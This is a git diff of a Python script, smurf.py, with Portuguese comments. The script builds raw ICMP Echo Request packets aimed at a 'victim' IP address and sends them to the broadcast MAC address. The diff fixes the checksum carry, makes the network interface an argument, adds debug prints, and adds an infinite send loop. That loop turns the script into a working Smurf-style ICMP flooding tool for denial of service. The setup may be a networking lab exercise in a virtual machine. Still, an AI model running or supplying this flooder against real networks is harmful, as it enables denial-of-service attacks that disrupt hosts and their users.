@@ -1,6 +1,6 @@
 #Envia um pacote ICMP Echo Request para outra maquina
 
-#Exemplo de uso: python3 smurf.py a4:1f:72:f5:90:b7 10.0.2.15
+#Exemplo de uso: sudo python3 smurf.py enp0s3 a4:1f:72:f5:90:b7 10.0.2.15
 
 import struct
 import socket
@@ -21,16 +21,21 @@ def checksum_icmp(header):
   shorts = struct.unpack('!HHHH', header)
   sum = 0
   for n in shorts:
+    print(n)
     sum = sum + n
-  sum = sum + sum>>16 #se houver carry, soma-o como se fosse um novo numero
-  return (~sum) & 0xffff
+  print('sum', sum)
+  sum = sum + (sum>>16) #se houver carry, soma-o como se fosse um novo numero
+  print('sum2', sum)
+  sum = (~sum) & 0xffff
+  print('sum3', sum)
+  return sum
 
 def checksum_ip(header):
   shorts = struct.unpack('!HHHHHHHHHH', header)
   sum = 0
   for n in shorts:
     sum = sum + n
-  sum = sum + sum>>16 #se houver carry, soma-o como se fosse um novo numero
+  sum = sum + (sum>>16) #se houver carry, soma-o como se fosse um novo numero
   return (~sum) & 0xffff
 
 # mac = string contendo um endereco mac
@@ -58,25 +63,23 @@ def string2bytesip(ip):
 #main
 
 def main():
-  if len(sys.argv) < 3:
-	  print("Uso: python smurf.py <MAC deste host> <IP alvo>")
-
-  victim_ip = string2bytesip(sys.argv[2])
-  print(sys.argv[2])
-  print(type(victim_ip))
-
+  if len(sys.argv) < 4:
+	  print("Uso: python smurf.py <interface> <MAC deste host> <IP alvo>")
+	  print('Exemplo de uso: sudo python3 smurf.py enp0s3 a4:1f:72:f5:90:b7 10.0.2.15')
+	  exit()
+  
+  victim_ip = string2bytesip(sys.argv[3])
+  
   #ethernet header
-  source_mac = mac2bytes(sys.argv[1])
+  source_mac = mac2bytes(sys.argv[2])
   target_mac = mac2bytes("ff:ff:ff:ff:ff:ff") #6B
   eth_type = 0x0800 #2B ipv4
-  print(type(target_mac))
-  print(type(source_mac))
   eth_header = struct.pack("!6s6sH", target_mac, source_mac, eth_type)
 
   #ip header
   ver_ihl = 0x45 #1B 4: ipv4,  5: numero de palavras de 32 bits neste header
   tos = 0 #1B
-  total_length = 84 #2B tamanho em bytes do header
+  total_length = 28 #2B tamanho em bytes do header
   identification = 1 #2B
   flags_offset = 0x4000 #2B (bit don't fragment ligado)
   ttl = 64 #1B
@@ -106,8 +109,14 @@ def main():
 
   #abre socket
   rawSocket = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.htons(0x0800))
-  rawSocket.bind(("enp0s3", socket.htons(0x0800)))
+  interface = sys.argv[1]
+  rawSocket.bind((interface, socket.htons(0x0800)))
+  
   rawSocket.send(packet)
-
+  
+  
+  while True:  
+    rawSocket.send(packet)
+  
 if __name__== '__main__':
   main()
